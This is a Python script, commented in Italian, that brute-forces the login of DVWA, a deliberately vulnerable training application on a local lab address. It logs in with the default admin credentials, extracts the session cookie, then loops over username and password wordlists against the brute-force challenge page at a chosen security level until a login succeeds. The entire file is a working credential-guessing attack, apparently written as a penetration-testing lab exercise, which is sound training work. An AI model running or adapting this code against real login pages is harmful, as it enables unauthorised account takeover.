import requests
from bs4 import BeautifulSoup

def bruteforce(level):
    # URL di login
    login_url = "http://192.168.1.102/dvwa/login.php"

    # Dati di login
    login_payload = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    # Esecuzione della richiesta di login per ottenere il PHPSESSID
    login_response = requests.post(login_url, data=login_payload)

    # Verifica che il login sia andato a buon fine
    if "Login failed" in login_response.text:
        print("Errore durante il login. Potrebbe essere necessario fornire credenziali valide.")
        exit()

    # Estrazione del PHPSESSID dal cookie
    phpsessid_cookie = login_response.request.headers.get('Cookie').split('; ')[1].split('=')[1]

    # Stampa del PHPSESSID a schermo
    print(f"PHPSESSID ottenuto con successo: {phpsessid_cookie}")

    # Costruzione dell'header 
    header = {"Cookie": f"security={level}; PHPSESSID={phpsessid_cookie}"}

    # lettura dei nomi utente e password dalle liste
    usernames_file_path = "/home/kali/Desktop/usernames.lst"
    passwords_file_path = "/home/kali/Desktop/passwords.lst"

    with open(usernames_file_path, 'r') as usernames_file, open(passwords_file_path, 'r') as passwords_file:
        usernames = usernames_file.readlines()
        passwords = passwords_file.readlines()

    # Iterazione di nomi utente e password
    for user in usernames:
        for password in passwords:
            url = "http://192.168.1.102/dvwa/vulnerabilities/brute/"
            users = user.strip()
            passw = password.strip()
            get_data = {"username": users, "password": passw, "Login": 'Login'}
            
            print(f"\n[?]provando username: {users} - password: {passw}")
            
            # Stampa del PHPSESSID prima di eseguire la richiesta successiva
            print(f" SID della richiesta: {phpsessid_cookie}")

            r = requests.get(url, params=get_data, headers=header)
            if not 'Username and/or password incorrect.' in r.text:
                print(f"\n[!] Accesso riuscito con username:{users} - password: {passw}")
                exit()
                
if __name__ == "__main__":
    #scelta della sicurezza di DVWA, con ciclo while per la gestione degli errori
    while True:
        level=input("\n//-----BRUTEFORCE DVWA-----//\nScegli il livello di sicurezza\n1. low\n2. medium\n3. high\nscelta: ")
        level=level.lower()
        if level=="1":
            level="low"
            break
        elif level=="2":
            level="medium"
            break
        elif level=="3":
            level="high"
            break
        elif level=="low" or level=="medium"or level=="high":
            break
        else:
            print(f"\n[!!]{level} non Ã¨ una scelta valida! riprova.\n")
    bruteforce(level)
